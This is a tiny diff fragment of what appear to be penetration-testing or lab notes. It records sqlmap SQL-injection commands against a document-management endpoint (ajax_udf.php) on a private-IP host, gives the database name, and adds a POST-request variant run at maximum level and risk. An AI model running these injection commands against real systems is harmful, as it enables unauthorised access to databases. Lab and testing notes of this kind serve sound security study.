@@ -10,5 +10,5 @@ sqlmap -u "http://192.168.124.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" 
 
 Database name - jabcd0cs
 
-
-
+POST Request
+sqlmap -r req.txt --level=5 --risk=3 --dbs
